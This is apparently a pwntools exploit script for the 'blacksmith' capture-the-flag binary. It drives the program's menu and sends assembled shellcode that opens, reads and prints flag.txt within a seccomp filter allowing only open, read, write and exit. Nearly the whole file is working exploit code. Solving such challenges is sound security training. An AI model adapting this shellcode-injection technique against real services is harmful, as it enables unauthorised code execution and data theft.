#!/usr/bin/env python3

from pwn import *

e = ELF("./blacksmith_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(shield+0x8c)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # The shield() allows 63-byte input to be executed.
    # However, the sec() only allows: read(), write(), open(), exit()
    # Directly read, open, and write the flag.txt output to screen will exceed the buffer length.
    # So we need staged payloads.

    # More elegant shellcraft version.
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'>', b'2')
    sc = shellcraft.open('flag.txt')
    sc += shellcraft.read('rax', 'rsp', 0x100)
    sc += shellcraft.write(1, 'rsp', 0x100)
    payload = asm(sc)
    r.sendlineafter(b'>', payload)

    r.interactive()

if __name__ == "__main__":
    main()
